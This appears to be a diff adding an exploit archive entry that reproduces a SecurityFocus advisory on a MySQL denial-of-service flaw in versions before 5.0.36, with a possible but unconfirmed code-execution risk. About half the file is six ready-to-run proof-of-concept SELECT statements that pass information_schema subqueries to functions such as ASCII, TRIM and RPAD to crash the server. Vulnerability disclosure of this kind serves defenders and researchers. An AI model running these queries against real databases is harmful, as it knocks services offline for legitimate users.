@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/22900/info
+
+MySQL is prone to a remote denial-of-service vulnerability because it fails to handle certain select statements to database metadata.
+
+An attacker can exploit this issue to crash the application, denying access to legitimate users. The attacker may also be able to execute arbitrary code, but this has not yet been confirmed.
+
+NOTE: An attacker must be able to execute arbitrary SELECT statements on the vulnerable computer to exploit this issue. This may be through legitimate means or by exploiting other latent SQL-injection vulnerabilities.
+
+Versions prior to 5.0.36 are vulnerable. 
+
+SELECT ASCII((SELECT table_name FROM information_schema.columns ORDER BY 1));
+SELECT TRIM(LEADING FROM (SELECT table_name FROM information_schema.columns ORDER BY 1));
+SELECT SUBSTR((SELECT table_name FROM information_schema.tables ORDER BY 1),1,1);
+SELECT UPPER((SELECT table_name FROM information_schema.tables ORDER BY 1));
+SELECT RTRIM((SELECT table_name FROM information_schema.tables ORDER BY 1));
+SELECT RPAD((SELECT table_name FROM information_schema.tables ORDER BY 1),1,'lol');
+
